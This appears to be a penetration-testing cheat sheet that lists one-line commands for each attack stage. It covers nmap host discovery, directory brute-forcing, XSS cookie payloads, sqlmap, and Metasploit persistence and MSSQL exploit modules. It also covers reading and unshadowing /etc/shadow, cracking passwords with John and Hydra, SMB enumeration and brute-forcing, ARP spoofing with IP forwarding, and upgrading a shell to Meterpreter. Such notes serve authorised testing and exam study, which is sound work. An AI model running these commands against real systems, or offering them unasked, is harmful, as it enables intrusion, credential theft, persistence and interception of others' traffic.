First rough idea:                 fping -a -g <IPRANGE> 2>/dev/null

Create IP List file:              nmap -sn <RANGE> | grep "Nmap scan" | cut -d " " -f 5 > <FILE>
Detailed scan of hosts:           nmap -sV -n -v -Pn -p- -T4 -iL <FILE> -A --open

Regular Directory enum:           gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <URL>
Authenticated Directory enum:     dirb <URL> -u <USER>:<PASSWORD>
  
XSS:                              <script>alert('XSS')</script>
                                  <script>alert(document.cookie)</script>
                                  
SQLi:                             sqlmap -u <URL>
  
Win Persistence Metasploit:       exploit/windows/local/s4u_persistence
Generic Persistence Metasploit:   exploit/multi/local/persistence

Linux Hashes:                     /etc/passwd and /etc/shadow
                                  unshadow passwd shadow > hashes.txt
                                  
John Cracking Bruteforce:         john -incremental -users:<USERLIST> <FILE>
              Wordlist:           john -wordlist=<WORDLIST> <FILE>
              Mangling:           john -wordlist=<WORDLIST> -rules <FILE>
  
Bruteforcing with Hydra:          hydra <IP> ssh -L <USERLIST> -P <WORDLIST> -f -V
  
Copy files through SCP:           scp user@<IP>/<DIR>/<FILE> /<LOCAL>/<PATH>
  
SMB Share Basics:                 smbclient -L \\<IP> -N
                                  enum4linux -s /usr/share/enum4linux/share-list.txt <IP>
                                  /usr/share/doc/python3-impacket/examples/samrdump.py <IP>
                                  nmap --script=smb-enum-shares.nse <IP>
                                  nmap --script=smb-check-vulns.nse --script-args=unsafe=1 <IP>
  
SMB Bruteforcing:                 nmap --script=smb-brute.nse <IP>
  
ARPspoof with DSniff:             echo 1 > /proc/sys/net/ipv4/ip_forward
                                  arpspoof -i <INTERFACE> -t <TARGET> -r <HOST>
  
Python Shell Upgrade:             python -c 'import pty; pty.spawn("/bin/bash")'

Shell to Meterpreter:             post/multi/manage/shell_to_meterpreter

MS SQL Authenticated comp:        auxiliary/scanner/mssql/mssql_login
                                  auxiliary/admin/mssql/mssql_enum
                                  exploit/windows/mssql/mssql_payload
                                  
Adding Routes:                    ip route add <IP RANGE> via <GATEWAY IP>
